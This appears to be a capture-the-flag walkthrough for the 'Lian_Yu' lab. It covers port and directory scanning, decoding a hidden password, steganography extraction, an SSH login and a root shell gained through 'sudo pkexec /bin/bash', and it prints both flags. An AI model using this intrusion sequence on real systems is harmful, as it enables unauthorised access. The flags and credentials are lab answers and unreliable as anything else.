### lian_yu

## 9/18/20

### IP

IP `10.10.137.46`

### nmap scan

nmap scan
nmap -sC -sV -p- -oN nmap/initial 10.10.137.46

```
# Nmap 7.80 scan initiated Fri Sep 18 19:40:24 2020 as: nmap -sC -sV -oN nmap/initial 10.10.137.46
Nmap scan report for 10.10.137.46
Host is up (0.27s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35556/udp   status
|   100024  1          49617/udp6  status
|   100024  1          53353/tcp6  status
|_  100024  1          60791/tcp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 18 19:42:35 2020 -- 1 IP address (1 host up) scanned in 130.54 seconds
```

### gobuster scan

gobuster dir -u 10.10.137.46 -w /usr/share/wordlists/directory-list-2.3-medium.txt -o gobuster_scan.txt

/island (Status: 301)
/server-status (Status: 403)

#### gobuster scan of /island/2100

gobuster dir --url 10.10.137.46/island/2100 --wordlist /usr/share/wordlists/directory-list-2.3-medium.txt -x .ticket

/green_arrow.ticket
reveals RTy8yhBQdscX
convert from base58 !#th3h00d

### Hexedit

used hexedit to change the image Leave_me_alone.png (would not open)
password

### Steghide

used steghide on the aa.jpg
password

### Unzip ss

archive:  ss.zip
  inflating: passwd.txt
  inflating: shado
[inflatus@cheese-shop gobuster]$ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

[inflatus@cheese-shop gobuster]$ cat shado
M3tahuman

### ssh with username and password

ssh 10.10.127.190
slade
M3tahuman

cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
   --Felicity Smoak

### privesc

sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec /bin/bash

root@LianYu:~# ls -l
total 4
-rw-r--r-- 1 root root 340 May  1 07:17 root.txt
root@LianYu:~# cat root.txt
                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
               --DEATHSTROKE
